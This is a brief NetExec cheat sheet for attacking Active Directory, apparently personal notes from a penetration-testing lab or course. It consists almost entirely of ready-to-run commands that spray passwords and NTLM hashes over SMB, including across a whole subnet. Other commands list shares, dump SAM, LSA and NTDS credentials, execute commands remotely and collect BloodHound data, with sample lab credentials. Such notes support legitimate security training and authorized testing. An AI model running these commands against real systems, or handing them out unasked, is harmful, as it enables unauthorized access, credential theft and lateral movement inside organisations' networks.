Note: Pwn3d! means code exec and RDP possible

Spraying
	if you have a user list, always try spraying the list on both users and passwords

General Usage
```bash
#Collect creds as you enumerate a network and reuse them

# Spray domain users
nxc smb 172.16.182.13 -u users -H hashes --continue-on-success
nxc smb 172.16.182.13 -u users -p passwords --continue-on-success

# Spray for local users
nxc smb <ip> -U users -P passwords --continue-on-success --local-auth
nxc smb <ip> -U users -H hashes --continue-on-success --local-auth

# Spray subnet for user !!!
nxc smb 10.10.10.0/24 -u bob -p password123

# List Share
netexec smb 172.16.191.11 -u joe -d medtech.com -p "Flowers1" --shares

# List User info
--users

# Dump Creds
--sam
--las
--ntds

# Command execution
-x <command>
```

Collect Bloodhound data
```bash
nxc ldap '<dc_hostname.domain>(or IP address)' -d '<domain_name>' -u '<user>' -p '<password>' --bloodhound -c All --dns-server <ip_address (usually of DC)>

# proxychains
proxychains -q nxc ldap DC1.ad.lab -d 'ad.lab' -u 'john.doe' -p 'P@$$word123!' --bloodhound -c All --dns-server 10.80.80.2 --dns-tcp
```

Enumerate user's descriptions fields
```bash
nxc ldap <ip> -d '<domain_name>' -u '<user>' -p '<password>' -M get-desc-users
```